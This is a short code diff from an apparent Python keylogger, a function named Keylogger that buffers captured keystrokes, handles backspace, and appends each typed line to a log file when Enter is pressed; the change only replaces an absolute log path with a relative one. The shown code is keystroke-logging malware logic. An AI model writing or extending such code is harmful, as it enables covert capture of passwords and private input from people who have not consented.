@@ -17,7 +17,7 @@ def Keylogger(key):
         if str(key) == 'Key.backspace':
             result_string = result_string[:-1]
         if str(key) == 'Key.enter':
-            with open('/home/xic/file.txt', 'a') as file:
+            with open('file.txt', 'a') as file:
                 file.write(result_string + '\n')
             result_string = ''
     except KeyboardInterrupt:
